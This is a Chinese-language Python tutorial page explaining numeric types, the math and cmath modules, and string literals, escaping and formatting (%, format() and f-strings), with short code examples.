int: 有符号整型,通常被称为是整型或整数,是正或负整数,不带小数点
long: 长整型(long integers)[也可以代表八进制和十六进制],无限大小的整数,整数最后是一个大写或小写的L
long类型只存在于Python2.X版本中,在2.2以后的版本中int类型数据溢出后会自动转为long类型。在Python3.X版本中long类型被移除,使用int替代

</pre><textarea>
# 定义变量a,赋值为56
a = 56
print(a)         # 56
# 为a赋值一个大整数
a = 9999999999999999999999
print(a)         # 9999999999999999999999
# type()函数用于返回变量的类型
print(type (a))  # < class 'int'>

</textarea><pre>
Python的整型数值有4种表示形式:
十进制形式:最普通的整数就是十进制形式的整数,在使用十进制表示整数值时不能以0作为十进制数的开头,数值是0除外
二进制形式:由0和1组成,以0b或0B开头,例如101对应十进制数是5
八进制形式:八进制整数由0~7组成,以0o或0O开头,在Python2.x中八进制数值还可以直接以0开头
十六进制形式:由0~9以及A~F或a~f组成,以0x或0X开头

</pre><textarea>
# 以0b或0B开头的整型数值是二进制形式的整数
bin_val = 0b111
print(bin_val)   # 7
bin_val = 0B101
print(bin_val)   # 5

# 以0o或0O开头的整型数值是八进制形式的整数
oct_val = 0o54
print(oct_val)   # 44
oct_val = 0O17
print(oct_val)   # 15

# 以0x或0X开头的整型数值是十六进制形式的整数
hex_value1 = 0x13
hex_value2 = 0xaF
print(hex_value1) # 19
print(hex_value2) # 175

</textarea><pre>
为了提高数值包括浮点型的可读性,Python 3.x允许为数值增加下画线作为分隔符,这些下画线并不会影响数值本身
one_million = 1000000
print(one_million)   # 1000000
price = 234_234_234
print(price)         # 234234234
android = 12341234
print(android)       # 12341234

</pre><pre>
2、float: 浮点型(floating point real values)
浮点型数值用于保存带小数点的数值,由整数部分与小数部分组成,Python的浮点数有两种表示形式:
1、十进制形式:这种形式就是平常简单的浮点数,例如5.12、512.0、0.512。浮点数必须包含一个小数点,否则会被当成整数类型处理。
2、科学计数形式:例如5.12e2(即5.12×102)、5.12E2(也是5.12 ×102)、(2.5e2 = 2.5 x 102 = 250),只有浮点型数值才可以使用科学计数形式表示,例如51200是一个整型值,但512E2则是浮点型值

浮点数也就是小数,之所以称为浮点数是因为按照科学记数法表示时一个浮点数的小数点位置是可变的,比如1.23x109和12.3x108是完全相等的。浮点数可以用数学写法,如1.23,3.14,-9.01等。但是对于很大或很小的浮点数就必须用科学计数法表示,把10用e替代,1.23x109就是1.23e9,或12.3e8,0.000012可以写成1.2e-5

使用浮点数进行计算时可能会出现小数位数不确定的情况,比如说计算 0.1+0.2本来应该得到0.3,但经过测试Python解释器的运行结果为0.30000000000000004。几乎所有编程语言都存在这个问题,这与浮点数在底层的存储方式有关系

</pre><textarea>
af1 = 5.2345556
print(af1)        # 5.2345556
af2 = 25.2345
print(type(af2))  # < class 'float'>
f1=5.12e2
print(f1)         # 512.0
f2 = 5e3
print(f2)         # 5000.0
print(type(f2))   # < class 'float'>

</textarea><pre>
整数和浮点数在计算机内部存储的方式是不同的,整数运算永远是精确的,除法也是精确的,而浮点数运算则可能会有四舍五入的误差

在Python中有两种除法,一种除法是/:
>>> 10 / 3
3.3333333333333335

/除法计算结果是浮点数,即使是两个整数恰好整除,结果也是浮点数:
>>> 9 / 3
3.0

还有一种除法是//,称为地板除,两个整数的除法仍然是整数:
>>> 10 // 3
3

整数的地板除//永远是整数,即使除不尽。要做精确的除法,使用/就可以。
因为//除法只取结果的整数部分,所以Python还提供一个余数运算,可以得到两个整数相除的余数:
>>> 10 % 3
1
无论整数做//除法还是取余数,结果永远是整数,所整数运算结果永远是精确的

如果不使用Decimal模块,那么直接做浮点运算获得的小数,可能是不准确的。例如0.1+0.2它的结果不是0.3而是0.30000000000000004。这不是Python的问题,而是浮点数在计算机中不能总是精确储存导致的问题
Python的内置fractions模块可以直接进行分数运算,输入是分数,输出还是分数,分数不转换为小数,就不会出现浮点数精确性问题了

</pre><textarea>
from fractions import Fraction

# 第一个参数为分子,第2个参数为分母
a = Fraction(1, 10)
b = Fraction(2, 10)
print(a + b)    # 3/10

# 还可以直接接收一个浮点数或者字符串形式的分数作为参数
c = Fraction('3/7')
d = Fraction(0.27)
print(c + d)     # 11011301088920863/15762598695796736

</textarea><pre>
3、complex: 复数(complex numbers)
Python甚至可以支持复数,复数的虚部用j或J来表示
如果需要在程序中对复数进行计算,可导入Python的cmath模块(c代表complex),在该模块下包含了各种支持复数运算的函数
由实数部分和虚数部分构成,可以用a + bj或complex(a,b)表示,复数的实部a和虚部b都是浮点型

</pre><textarea>
ac1 = 3 + 0.2j
print (ac1)        # (3+0.2j)
print(type(ac1))   # < class 'complex'>
ac2 = 4 - 0.1j
print(ac2)         # (4-0.1j)
#复数运行
print(ac1 + ac2)   # (7+0.1j)
#导入cmath 模块
import cmath
#sqrt()是cmath模块下的商数,用于计算平方根
ac3 = cmath.sqrt(-1)
print (ac3)        # 1j

</textarea><pre>
【 Pythonmath模块、cmath模块 】
Python中数学运算常用的函数基本都在math模块、cmath模块中。
Python math模块提供了许多对浮点数的数学运算函数。
Python cmath模块包含了一些用于复数运算的函数。

cmath模块的函数跟math模块函数基本一致,区别是cmath模块运算的是复数,math模块运算的是数学运算。

要使用math或cmath函数必须先导入:
import math

查看math包中的内容:
>>> import math
>>> dir(math)
['__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'acos', 'acosh', 'asin', 'asinh', 'atan', 'atan2', 'atanh', 'ceil', 'copysign', 'cos', 'cosh', 'degrees', 'e', 'erf', 'erfc', 'exp', 'expm1', 'fabs', 'factorial', 'floor', 'fmod', 'frexp', 'fsum', 'gamma', 'gcd', 'hypot', 'inf', 'isclose', 'isfinite', 'isinf', 'isnan', 'ldexp', 'lgamma', 'log', 'log10', 'log1p', 'log2', 'modf', 'nan', 'pi', 'pow', 'radians', 'sin', 'sinh', 'sqrt', 'tan', 'tanh', 'tau', 'trunc']

查看cmath包中的内容
>>> import cmath
>>> dir(cmath)
['__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'acos', 'acosh', 'asin', 'asinh', 'atan', 'atanh', 'cos', 'cosh', 'e', 'exp', 'inf', 'infj', 'isclose', 'isfinite', 'isinf', 'isnan', 'log', 'log10', 'nan', 'nanj', 'phase', 'pi', 'polar', 'rect', 'sin', 'sinh', 'sqrt', 'tan', 'tanh', 'tau']

>>> import cmath
>>> cmath.sqrt(-1)
1j
>>> cmath.sqrt(9)
(3+0j)
>>> cmath.sin(1)
(0.8414709848078965+0j)
>>> cmath.log10(100)
(2+0j)

【 Python数学函数 】
abs(x)
返回一个数的绝对值,实参可以是整数或浮点数,如果实参是一个复数则返回它的模,如abs(-10)返回10

ceil(x)
返回数字的上入整数,如math.ceil(4.1) 返回 5

cmp(x, y)
如果x < y返回 -1, 如果x == y返回0, 如果x > y返回1,如cmp(1, 2) 返回 -1

exp(x)
返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045

fabs(x)
返回数字的绝对值,如math.fabs(-10) 返回10.0

floor(x)
返回数字的下舍整数,如math.floor(4.9)返回 4

log(x)
如math.log(math.e)返回1.0,math.log(100,10)返回2.0

log10(x)
返回以10为基数的x的对数,如math.log10(100)返回 2.0

max(x1, x2,...)
返回给定参数的最大值,参数可以为序列。如max(1,1,8,6) 返回 8

min(x1, x2,...)
返回给定参数的最小值,参数可以为序列。如min(1,0,8,6) 返回 0

modf(x)
返回x的整数部分与小数部分,两部分的数值符号与x相同,整数部分以浮点型表示。

pow(x, y)
x**y 运算后的值。如pow(2,3) 返回 8

round(number[, ndigits])
返回number舍入到小数点后ndigits位精度的值,如果ndigits被省略或为None则返回最接近输入值的整数,如round(10.25)返回10.0

sqrt(x)
返回数字x的平方根,math.sqrt(2)


class int([x])
class int(x, base=10)
返回一个使用数字或字符串x生成的整数对象,没有实参时返回0 。如果x定义了__int__()则int(x)返回x.__int__()。如果x定义了__trunc__()则返回x.__trunc__()。对于浮点数它向零舍入。
如果x不是数字或有base参数,x必须是字符串、bytes、表示进制为base的整数字面值的bytearray实例。该文字前可以有+或-(中间不能有空格),前后可以有空格。一个进制为n的数字包含0到n-1的数,其中a到z或A到Z表示10到35。默认的base为10 ,允许的进制有0、2-36。2、8、16进制的数字可以在代码中用0b/0B、0o/0O、0x/0X前缀来表示。进制为0将安照代码的字面量来精确解释,最后的结果会是2、8、10、16进制中的一个。所以int('010', 0)是非法的,但int('010')和int('010', 8)是合法的。

class float([x])
返回从数字或字符串x生成的浮点数。
如果实参是字符串则它必须是包含十进制数字的字符串,字符串前面可以有符号,之前也可以有空格。可选的符号有'+'和'-','+'对创建的值没有影响。实参也可以是NaN(非数字)、正负无穷大的字符串。确切地说除去首尾的空格后输入必须遵循以下语法:
sign           ::=  "+" | "-"
infinity       ::=  "Infinity" | "inf"
nan            ::=  "nan"
numeric_value  ::=  floatnumber | infinity | nan
numeric_string ::=  [sign] numeric_value
floatnumber是Python浮点数的字符串形式,字母大小写都可以,例如"inf"、"Inf"、"INFINITY"、"iNfINity"都可以表示正无穷大。
如果实参是整数或浮点数则返回具有相同值的浮点数。如果实参在Python浮点精度范围外则会触发OverflowError。
对于一般的Python对象x,float(x)指派给x.__float__()
如果没有实参则返回 0.0 。

bin(x)
将整数x转变为前缀为"0b"的二进制字符串,结果是一个合法的Python表达式,如果x不是Python的int对象,那它需要定义__index__()方法返回一个整数
>>> bin(3) # '0b11'
>>> bin(-10) # '-0b1010'
如果不一定需要前缀"0b",还可以使用如下的方法
>>> format(14, '#b'), format(14, 'b')  # ('0b1110', '1110')
>>> f'{14:#b}', f'{14:b}'              # ('0b1110', '1110')

oct(x)
将整数x转变为前缀为"0o"的八进制字符串。结果是一个合法的Python表达式。如果x不是Python的int对象,那它需要定义__index__()方法返回一个整数
>>> oct(8)    # '0o10'
>>> oct(-56)  # '-0o70'
如果要将整数转换为八进制字符串,并可选择有无"0o"前缀,则可以使用如下方法:
>>> '%#o' % 10, '%o' % 10              # ('0o12', '12')
>>> format(10, '#o'), format(10, 'o')  # ('0o12', '12')
>>> f'{10:#o}', f'{10:o}'              # ('0o12', '12')

【 Python随机数函数 】
以下方法不能直接访问,需要导入random模块,然后通过random静态对象调用对应的方法

choice(seq) 从序列的元素中随机挑选一个元素,比如random.choice(range(10)),从0到9中随机挑选一个整数。
randrange ([start,] stop [,step]) 从指定范围内按指定基数递增的集合中获取一个随机数,基数缺省值为1
random()  随机生成下一个在[0,1)范围内的实数,如random.random() 返回 0.7059676715503392
seed([x]) 改变随机数生成器的种子seed,如果不了解其原理则不必特别去设定seed,Python会自动选择seed。
shuffle(lst)  将序列的所有元素随机排序
uniform(x, y) 随机生成下一个在[x,y]范围内的实数

【 Python三角函数 】
以下方法不能直接访问,需要导入math模块,然后通过math静态对象调用对应的方法

acos(x) 返回x的反余弦弧度值。
asin(x) 返回x的反正弦弧度值。
atan(x) 返回x的反正切弧度值。
atan2(y, x) 返回给定的 X 及 Y 坐标值的反正切值。
cos(x)  返回x的弧度的余弦值。
hypot(x, y) 返回欧几里德范数 sqrt(x*x + y*y)。
sin(x)  返回的x弧度的正弦值。
tan(x)  返回x弧度的正切值。
degrees(x)  将弧度转换为角度,如degrees(math.pi/2) 返回 90.0
radians(x)  将角度转换为弧度

【 Python数学常量 】
数学常量pi, 圆周率一般以π来表示
数学常量e,e即自然常数

</pre>
</div>

<div id="string">
<h4>Python字符串</h4><pre>
字符串(String)是由数字、字母、下划线组成的一串字符,是编程语言中表示文本的数据类型
Python 3.x对中文字符支持较好,但Python 2.x则要求在源程序中增加"#coding:utf-8"才能支持中文字符

【 repr(object) 】
返回包含一个对象的可打印表示形式的字符串。对于许多类型来说该函数会尝试返回的字符串将会与该对象被传递给eval()时所生成的对象具有相同的值,在其他情况下表示形式会是一个括在尖括号中的字符串,其中包含对象类型的名称与通常包括对象名称和地址的附加信息。 类可以通过定义__repr__()方法来控制此函数为它的实例所返回的内容

str()函数是用于返回人类可读的值的表示,而repr()是用于生成解释器可读的表示,如果没有等效的语法则会强制执行SyntaxError,对于没有人类可读性的表示的对象str()将返回和repr()一样的值。很多值使用任一函数都具有相同的表示,比如数字或类似列表和字典的结构。特殊的是字符串有两个不同的表示

</pre><textarea>
>>> s = 'Hello, world.'
>>> str(s)
'Hello, world.'
>>> repr(s)
"'Hello, world.'"
>>> str(1/7)
'0.14285714285714285'
>>> x = 10 * 3.25
>>> y = 200 * 200
>>> s = 'The value of x is ' + repr(x) + ', and y is ' + repr(y) + '...'
>>> print(s)
The value of x is 32.5, and y is 40000...
>>> # The repr() of a string adds string quotes and backslashes: hello = 'hello, world\n'
>>> hellos = repr(hello)
>>> print(hellos)
'hello, world\n'
>>> # The argument to repr() may be any Python object: repr((x, y, ('spam', 'eggs')))
"(32.5, 40000, ('spam', 'eggs'))"

</textarea><pre>
【 str() 】
class str(object='')
class str(object=b'', encoding='utf-8', errors='strict')
返回object的字符串版本,如果未提供object则返回空字符串,在其他情况下str()的行为取决于encoding或errors是否有给出
如果encoding或errors均未给出,str(object)返回object.__str__(),这是object的"非正式"或格式良好的字符串表示。 对于字符串对象,这是该字符串本身。 如果object没有__str__()方法则str()将回退为返回repr(object)。

如果encoding或errors至少给出其中之一,则object应该是一个bytes-like object例如bytes或bytearray,在此情况下如果object是一个bytes或bytearray)对象,则str(bytes, encoding, errors)等价于bytes.decode(encoding, errors),否则在调用bytes.decode()之前获取缓冲区对象下层的bytes对象

将一个bytes对象传入str()而不给出encoding或errors参数的操作属于第一种情况,将返回非正式的字符串表示

print(str(b'Zoot!'))  # "b'Zoot!'"

</pre>字符串操作<textarea>
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

s = 'Hello World!'
print(type(s))            # < class 'str'>
print(s)                  # 输出完整字符串
print(s[0])               # 输出字符串中的第一个字符,输出:H
print(s[2:5])             # 输出字符串中第三个至第六个之间的字符串,输出:'llo'
print(s[:5])              # print s[0:5]的简写
print(s[2:])              # 输出从第三个字符开始的字符串,输出:llo World!
print(s[::-1])            # 反转字符串,输出:!dlroW olleH
print(s * 2)              # 输出字符串两次,输出:Hello World!Hello World!
print(s + "TEST")         # 输出连接的字符串,输出:Hello World!TEST
print(s[:6] + 'Runoob!')  # Hello Runoob!

# 成员运算符
if ( "H" in s ): print("H在字符串s中")
if ( "A" not in s ): print("A不在字符串s中")

# 使用全局内置的 min() 和 max() 函数获取字符串中最小字符和最大字符
# 输出s字符串中最大的字符
print(max(s))          # r
# 输出s字符串中最大的字符
print(min(s))          # 空格

# Python中的字符串不能被修改,它们是immutable的,因此向字符串的某个索引位置赋值会产生一个错误
word[0] = 'J'          # TypeError: 'str' object does not support item assignment
word[2:] = 'py'        # TypeError: 'str' object does not support item assignment

# 如果需要一个不同的字符串则应当新建一个
print('J' + word[1:])  # 'Jython'
print(word[:2] + 'py') # 'Pypy'

</textarea>字符串拼接的三种类型：格式化类：%、format()、template拼接类：+、()、join()插值类：f-string<textarea>
# 用+进行连接,也可以用*进行重复
# 当拼接的最终字符串长度不超过20时,+号操作符的方式会比join等方式快得多,这与+号的使用次数无关
>>> 3 * 'un' + 'ium'  # 'unununium'

# 类似元组方式:相邻的两个或多个字符串字面值将会自动连接到一起,空格可有可无,但括号()内要求元素是真实字符串,不能混用变量
>>> 'Py' 'thon'       # 'Python'
>>> 'Py''thon'        # 'Python'

# 把很长的字符串拆开分别输入的时候尤其有用
>>> text = ('Put several strings within parentheses '
...         'to have them joined together.')
>>> text             # 'Put several strings within parentheses to have them joined together.'

# 只能对两个字面值这样操作,变量或表达式不行
>>> prefix = 'Py'
>>> prefix 'thon'     # SyntaxError: invalid syntax
>>> ('un' * 3) 'ium'  # SyntaxError: invalid syntax

# 如果想连接变量或连接变量和字面值可以用+号
>>> prefix + 'thon'
'Python'

# 字符串拼接数字:Python不允许直接拼接数字和字符串,程序必须先将数字转换成字符串
s1 = "这是数字: "
p = 99.8
# 字符串直接拼接数值,程序报错
print(s1 + p)
# 使用str()将数值转换成字符串,str是Python内置的类型
print(s1 + str(p))
# 使用repr()将数值转换成字符串,repr()则只是一个函数,此外repr()会以Python表达式的形式来表示值
print(s1 + repr(p))

# 带引号的字符串就是Python字符串的表达式形式,在交互式解释器中输入一个变量或表达式时,Python会自动使用repr()函数处理该变量或表达式
st = "I will play my fife"
print (st)       # I will play my fife
print(repr(st))  # 'I will play my fife'

# 来自C语言的占位符%号格式化字符串的方式
print('%s %s' % ('Hello', 'world'))  # Hello world

# format()拼接方式使用花括号{}做占位符,在format方法中再转入实际的拼接值
'Hello {}! I`m {}.'.format('World', 'Pythoner')                       # Hello World! I`m Pythoner
'Hello {0}! I`m {1}.'.format('World', 'Pythoner')                     # Hello World! I`m Pythoner
'Hello {name1}! I`m {name2}.'.format(name1='World', name2='Pythoner') # Hello World! I`m Pythoner

# join()拼接方式,join()方法接受一个序列参数实现拼接,拼接时元素若不是字符串需要先转换一下,这种方法比较适用于连接序列对象中如列表)元素,并设置统一的间隔符。当拼接长度超过20时这种方式基本上是首选。不过缺点就是不适合进行零散片段的、不处于序列集合的元素拼接。
str_list = ['Hello', 'world']
str_join1 = ' '.join(str_list)
str_join2 = '-'.join(str_list)

# f-string方式,字面字符串插值,从Python3.6版本引入。其特点是在字符串前加f标识,字符串中间则用花括号{}包裹其它字符串变量。
# 这种方式在可读性上秒杀format()方式,处理长字符串的拼接时,速度与join()方法相当
# {}内不能包含反斜杠\,但可以使用不同的引号,或使用三引号。使用引号是将不再表示一个变量,而是当作了字符串来处理。
name = 'world'
myname = 'python_cat'
words = f'Hello {name}. My name is {myname}.'
print(words)  # Hello world. My name is python_cat.

# f-string是在运行时进行渲染的,支持表达式如数学运算和对象操作
f'He will be { age+1 } years old next year.'  # 'He will be 4 years old next year.'
spurs = {"Guard": "Parker", "Forward": "Duncan"}
f"The {len(spurs)} players are: {spurs['Guard']} the guard, and {spurs['Forward']} the forward."
'The 2 players are: Parker the guard, and Duncan the forward.'
f'Numbers from 1-10 are {[_ for _ in range(1, 11)]}'
'Numbers from 1-10 are [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]'

数字操作
# 小数精度
PI = 3.141592653
f"Pi is {PI:.2f}"  # 'Pi is 3.14'

# 进制转换
f'int: 31, hex: {31:x}, oct: {31:o}'  # 'int: 31, hex: 1f, oct: 37'

# 与原始字符串联合使用(使其没有转义字符)
fr'hello\nworld'    # 'hello\\nworld'

# 插入大括号？
f"{{ {10 * 8} }}"   # '{ 80 }'
f"{{ 10 * 8 }}"     # '{ 10 * 8 }'

# 使用str.format(),非数字索引将自动转化为字符串,而f-strings则不会
"Guard is {spurs[Guard]}".format(spurs=spurs)  # 'Guard is Parker'
f"Guard is {spurs[Guard]}"                     # NameError: name 'Guard' is not defined
f"Guard is {spurs['Guard']}"                   # 'Guard is Parker'

</textarea><pre>
字符串是以单引号或双引号括起来的任意文本,单引号和双引号没有任何区别,引号本身只是一种表示方式,不是字符串的一部分,因此字符串'abc'只有a、b、c这3个字符

如果字符串内容本身包含了单引号或双引号,此时就需要进行特殊处理:
1、使用不同的引号将字符串括起来,比如"I'm OK",比如str4 = '"Spring is here,let us jam!", said woodchuck.'
2、对引号进行转义,如果字符串内部既包含'又包含"可以用转义字符\来标识,比如:'I\'m \"OK\"!'表示的字符串内容是:I'm "OK"!
str5 = '"we are scared,Let\'s hide in the shade",says the bird'
通过使用转义字符,向Python解释器表明了此单引号并不是和最前面的单引号进行配对的另一半,从而避免了发生语法错误

【 python用反斜杠(\)转义字符 】
转义可以理解为"采用某些方式暂时取消该字符本来的含义",这里的某种方式指的就是在指定字符前添加反斜杠\,以此来表示对该字符进行转义
\(在行尾时) 续行符
\\  反斜杠符号
\'  单引号
\"  双引号
\a  响铃
\b  退格(Backspace)
\e  转义
\000  空
\n  换行
\v  纵向制表符
\t  横向制表符
\r  回车
\f  换页
\oyy  八进制数,yy代表的字符,例如:\o12代表换行
\xyy  十六进制数,yy代表的字符,例如:\x0a代表换行
\other  其它的字符以普通格式输出

</pre><textarea>
s = 'Hello\nCharlie\nGood\nMorning'
print(s)

# 输出:类似列表
Hello
Charlie
Good
Morning

s2 = '商品名\t\t单价\t\t数量\t\t总价'
s3 = 'C语言小白变怪兽\t99\t\t2\t\t198'
print(s2)
print(s3)

# 输出:类似表格
商品名          单价            数量            总价
C语言小白变怪兽 99              2               198

</textarea><pre>
Python允许使用转义字符(\)对换行符进行转义,转义之后的换行符不会"中断"字符串,这样就可以把一个字符串写成两行
s2 = 'The quick brown fox \
jumps over the lazy dog'
print(s2)

同样的,Python的表达式也不允许随便换行,但如果程序需要对Python表达式换行就需要使用转义字符\
num = 20 + 3 / 4 + \
    2 * 3
print(num)

【 Python三引号(triple quotes) 长字符串 】
python中三引号可以将复杂的字符串进行赋值,允许一个字符串跨多行,字符串中可以包含换行符、制表符以及其他特殊字符。
三引号的语法是一对连续的单引号或双引号,通常都是成对使用
三引号让程序员从引号和特殊字符串的泥潭里面解脱出来,自始至终保持一小块字符串的格式是所谓的WYSIWYG(所见即所得)格式的。
典型的用例当需要一块HTML或者SQL时,这时当用三引号标记,使用传统的转义字符体系将十分费神

</pre><textarea>
>>> hi = '''hi
there'''
>>> hi         # repr()
'hi\nthere'
>>> print(hi)  # str()
hi
there

</textarea><pre>
Python多行注释使用三个引号(单引号、双引号都行)来包含多行注释内容,其实这是长字符串的写法,只是由于在长字符串中可以放置任何内容,包括放置单引号、双引号都可以,如果所定义的长字符串没有赋值给任何变量,那么这个字符串就相当于被解释器忽略了,也就相当于注释掉了。

实际上使用三个引号括起来的长字符串完全可以赋值给变量
s = '''"Let's go fishing", said Mary.
"OK, Let's go", said her brother.
they walked to a lake'''
print(s)

当程序中有大段文本内容要定义成字符串时,优先推荐使用长字符串形式,因为这种形式非常强大,可以让字符串中包含任何内容,既可包含单引号,也可包含双引号。

</pre>使用三重引号时字符串中的回车换行会自动包含到字符串中,如果不想包含则在行尾添加一个\即可<textarea>
print("""\
Usage: thingy [OPTIONS]
     -h                        Display this usage message
     -H hostname               Hostname to connect to
""")

# 将产生如下输出(注意最开始的换行没有包括进来):
Usage: thingy [OPTIONS]
     -h                        Display this usage message
     -H hostname               Hostname to connect to

</textarea><pre>
【 textwrap内置模块用来格式化显示文本 】
textwrap可以限制每多少个字符一行来对一个长句子进行换行,精确限制每一行多少个字符

import textwrap
s = '长句子'
formatted_s = textwrap.fill(s, 每行字符数)
formatted_s = textwrap.fill(s, 每行字符数, initial_indent=' ' * 4) # initial_indent设置首行缩进

【 原始字符串 】
如果字符串里面有很多字符都需要转义就需要加很多\,为了简化Python还允许在字符串的第一个引号前加上字母r或R表示''内部的字符串默认不转义
作用:去掉反斜杠的转移机制,特殊字符:即那些,反斜杠加上对应字母,表示对应的特殊含义的,比如最常见的"\n"表示换行,"\t"表示Tab等
应用:常用于正则表达式,对应着re模块。

</pre><textarea>
print(r"\n")          # \n
print(R"\n")          # \n
print('\\\t\\')       # \       \
print(r'\\\t\\')      # \\\t\\
print(r'"Let\'s go", said Charlie')  # "Let\'s go", said Charlie
print(r'G:\publish\codes\02\2.4')

>>> print('C:\some\name')  # here \n means newline!
C:\some
ame
>>> print(r'C:\some\name')  # note the r before the quote
C:\some\name

</textarea><pre>
由于原始字符串中的反斜线会对引号进行转义,因此原始字符串的结尾处不能是反斜线,否则字符串结尾处的引号会被转义,导致字符串不能正确结束。
如果确实要在原始字符串的结尾处添加反斜线怎么办呢？一种方式是不要使用原始字符串,而是改为使用长字符串写法(三引号字符串);另一种方式就是将反斜线单独写。
s3 = r'Good Morning' '\\'
print(s3)

如果字符串内部有很多换行,用\n写在一行里不好阅读,为了简化Python允许用'''...'''的格式表示多行内容
在输入多行内容时,提示符由>>>变为...,提示可以接着上一行输入,注意...是提示符,不是代码的一部分
>>> print('''line1
... line2
... line3''')
line1
line2
line3

多行字符串'''...'''还可以在前面加上r使用
>>> print(r'''hello,\n
... world''')
hello,\n
world

</pre><pre>
【 Python字符串格式化 】
1、Python2.6开始新增了一种格式化字符串的函数str.format(),它增强了字符串格式化的功能,它会用传入的参数依次替换字符串内的占位符{0}、{1}

</pre><textarea>
print('Hello, {0}, 成绩提升了{1:.1f}%'.format('小明', 17.125))  # 'Hello, 小明, 成绩提升了17.1%'

yes_votes = 42_572_654
no_votes = 43_132_495
percentage = yes_votes / (yes_votes + no_votes)
print('{:-9} YES votes  {:2.2%}'.format(yes_votes, percentage)) # ' 42572654 YES votes  49.67%'

</textarea><pre>
2、格式化字符串字面值常简称f-字符串、f-string
在字符串的开始引号或三引号之前加上一个f或F,在此字符串中可以在{和}字符之间写可以引用的变量或字面值的Python表达式{expression}
可选的格式说明符可以跟在表达式后面,这样可以更好地控制值的格式化方式

</pre><textarea>
year = 2016
event = 'Referendum'
print(f'Results of the {year} {event}')  # 'Results of the 2016 Referendum'

>>> # 将pi舍入到小数点后三位
>>> import math
>>> print(f'The value of pi is approximately {math.pi:.3f}')
The value of pi is approximately 3.142

>>> # 在 ':' 后传递一个整数可以让该字段成为最小字符宽度,这在使列对齐时很有用
>>> table = {'Sjoerd': 4127, 'Jack': 4098, 'Dcab': 7678}
>>> for name, phone in table.items():
...     print(f'{name:10} ==> {phone:10d}')
...
Sjoerd     ==>       4127
Jack       ==>       4098
Dcab       ==>       7678

>>> # 其他的修饰符可用于在格式化之前转化值,'!a'应用ascii(),'!s'应用str(),'!r'应用repr()
>>> animals = 'eels'
>>> print(f'My hovercraft is full of {animals}.')
My hovercraft is full of eels.
>>> print(f'My hovercraft is full of {animals!r}.')
My hovercraft is full of 'eels'.

</textarea><pre>
3、手动格式化字符串
str.rjust()、str.ljust()和str.center()这些方法不会写入任何东西,它们只是返回一个新的字符串,如果输入的字符串太长,它们不会截断字符串,而是原样返回,如果真的想截断可以添加一个切片操作,例如x.ljust(n)[:n]
str.zfill()会在数字字符串的左边填充零,它能识别正负号

</pre><textarea>
for x in range(1, 6):
    print(repr(x).rjust(2), repr(x*x).rjust(3), end=' ')
    print(repr(x*x*x).rjust(4))

 1   1    1
 2   4    8
 3   9   27
 4  16   64
 5  25  125

</textarea><pre>
4、Python提供了%对各种类型的数据进行格式化输出
字符串具有一种特殊的内置操作:使用 % (取模) 运算符。 这也被称为字符串的格式化或插值运算符。 对于format % values (其中format为一个字符串),在format中的%转换标记符将被替换为零个或多个values条目
如果format要求一个单独参数则values可以为一个非元组对象,否则values必须或是一个包含项数与格式字符串中指定的转换符项数相同的元组或一个单独映射对象如字典

price = 108
print ("the book's price is %s" % price) # the book's price is 108

上面程序中的print函数包含以下三个部分
第一部分是格式化字符串,相当于字符串模板,该格式化字符串中包含一个"%s"占位符,它会被第三部分的变量或表达式的值代替,"%s"指定将变量或值使用str()函数转换为字符串
第二部分固定使用"%"作为分隔符

如果格式化字符串中包含多个"%s"占位符,第三部分也应该对应地提供多个变量,并且使用圆括号将这些变量括起来
user = "Charli"
age = 8
print("%s is a %s years old boy" % (user , age))

转换说明符(Conversion Specifier)
%d 转换为带符号的十进制形式的整数
%i 转换为带符号的十进制形式的整数
%u 格式化无符号整型
%o 转换为带符号的八进制形式的整数
%x 转换为带符号的十六进制形式的整数
%X 转换为带符号的十六进制形式的整数(大写)
%e 转化为科学计数法表示的浮点数(e小写)
%E 转化为科学计数法表示的浮点数(E大写)
%f 转化为十进制形式的浮点数,可指定小数点后的精度
%F 转化为十进制形式的浮点数,可指定小数点后的精度
%g 智能选择使用%f或%e格式,%f和%e的简写
%G 智能选择使用%F或%E格式,%F和%E的简写
%c 格式化字符及其ASCII码
%r 使用repr()将变量或表达式转换为字符串
%s 使用str()将变量或表达式转换为字符串
%p 用十六进制数格式化变量的地址

</pre>在Python中采用的格式化方式用%实现,%运算符就是用来格式化字符串的。在字符串内部,%s表示用字符串替换,%d表示用整数替换,有几个%?占位符,后面就跟几个变量或值,顺序要对应。如果只有一个%?,括号可以省略<textarea>
print('Hello, %s' % 'world')                                # 'Hello, world'
print('Hi, %s, you have $%d.' % ('Michael', 1000000))       # 'Hi, Michael, you have $1000000.'
print("My name is %s and weight is %d kg!" % ('Zara', 21))  # 'My name is Zara and weight is 21 kg!'

# 当右边的参数为字典或其他映射类型时字符串中的格式必须包含加圆括号的映射键,对应'%'字符之后字典中的每一项,映射键将从映射中选取要格式化的值
print('%(language)s has %(number)03d quote types.' % {'language': "Python", "number": 2})
Python has 002 quote types.

# 如果不太确定应该用什么,%s永远起作用,它会把任何数据类型转换为字符串
print('Age: %s. Gender: %s' % (25, True))  # 'Age: 25. Gender: True'

# 字符串里面的%是一个普通字符时就需要转义,用%%来表示一个%
print('growth rate: %d %%' % 7)            # 'growth rate: 7 %'

# 格式化整数和浮点数还可以指定是否补0和整数与小数的位数
print('%2d-%02d' % (3, 1))   #  3-01
print('%.2f' % 3.1415926)    # 3.14

</textarea><pre>
默认转换出来的字符串总是右对齐的,不够宽度时左边补充空格。Python也允许在最小宽度之前添加一个标志来改变这种行为,这三个标志可以同时存在
-:指定左对齐。
+:表示数值总要带着符号(正数带"+",负数带"-")。
0:表示不补充空格,而是补充 0。

</pre><textarea>
# 指定转换后的最小宽度,程序自动在数值前面补充个空格
num = -28
print("num is: %6i" % num)  # num is:    -28
print("num is: %6d" % num)  # num is:    -28
print("num is: %6o" % num)  # num is:    -34
print("num is: %6x" % num)  # num is:    -1c
print("num is: %6X" % num)  # num is:    -1C
print("num is: %6s" % num)  # num is:    -28

num2 = 30
# 最小宽度为0,左边补0
print("num2 is: %06d" % num2)    # num2 is: 000030
# 最小宽度为6,左边补0,总带上符号
print("num2 is: %+06d" % num2)   # num2 is: +00030
# 最小宽度为6,右对齐
print("num2 is: %-6d" % num2)    # num2 is: 30

</textarea><pre>
对于转换浮点数,Python还允许指定小数点后的数字位数
